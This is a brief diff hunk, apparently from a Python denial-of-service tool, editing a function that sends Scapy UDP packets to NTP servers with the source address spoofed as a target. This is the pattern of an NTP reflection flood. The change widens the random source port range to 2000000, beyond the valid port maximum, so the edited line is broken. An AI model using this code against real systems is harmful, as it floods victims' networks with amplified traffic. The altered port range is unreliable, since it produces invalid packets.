@@ -82,7 +82,7 @@ def NTP(target, port, timer):
         try:
             packet = (
                     IP(dst=server, src=target)
-                    / UDP(sport=random.randint(1, 65535), dport=int(port))
+                    / UDP(sport=random.randint(1, 2000000), dport=int(port))
                     / Raw(load=ntp_payload)
             )
             try:
